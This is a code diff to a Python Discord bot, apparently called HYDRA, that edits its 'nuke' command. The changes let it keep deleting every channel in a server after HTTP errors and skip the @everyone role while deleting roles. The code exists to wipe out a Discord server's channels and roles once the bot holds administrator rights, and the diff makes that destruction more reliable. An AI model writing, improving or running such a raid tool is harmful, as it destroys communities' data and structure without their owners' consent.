@@ -281,9 +281,13 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                 bot_member = guild.get_member(client.user.id)
                 if bot_member.guild_permissions.administrator:
                     for channel in guild.channels:
-                        await channel.delete()
-                        time = datetime.now().strftime("%H:%M:%S")
-                        print(colored(f"{time}",'white'), colored(f"Deleted {channel}",'green'))
+                        try:
+                            await channel.delete()
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"Deleted {channel}",'green'))
+                        except discord.errors.HTTPException:
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"Couldn't delete {channel} because of an HTTP error.",'red'))
                     print(colored(f"{time}",'white'), colored("HYDRA - CHANNEL DELETION COMPLETE",'magenta'))
                 else:
                     time = datetime.now().strftime("%H:%M:%S")
@@ -311,15 +315,21 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                 bot_member = guild.get_member(client.user.id)
                 if bot_member.guild_permissions.administrator:
                     for channel in guild.channels:
-                        await channel.delete()
                         time = datetime.now().strftime("%H:%M:%S")
-                        print(colored(f"{time}",'white'), colored(f"Deleted {channel}",'green'))
+                        try:
+                            await channel.delete()
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"Deleted {channel}",'green'))
+                        except discord.errors.HTTPException:
+                            time = datetime.now().strftime("%H:%M:%S")
+                            print(colored(f"{time}",'white'), colored(f"Couldn't delete {channel} because of an HTTP error.",'red'))
                     for role in guild.roles:
                         if role.position < bot_member.top_role.position:
                             try:
-                                await role.delete()
-                                time = datetime.now().strftime("%H:%M:%S")
-                                print(colored(f"{time}",'white'), colored(f"Deleted {role}",'green'))
+                                if role.name != "@everyone":
+                                    await role.delete()
+                                    time = datetime.now().strftime("%H:%M:%S")
+                                    print(colored(f"{time}",'white'), colored(f"Deleted {role}",'green'))
                             except:
                                 if role.name != "@everyone":
                                     time = datetime.now().strftime("%H:%M:%S")
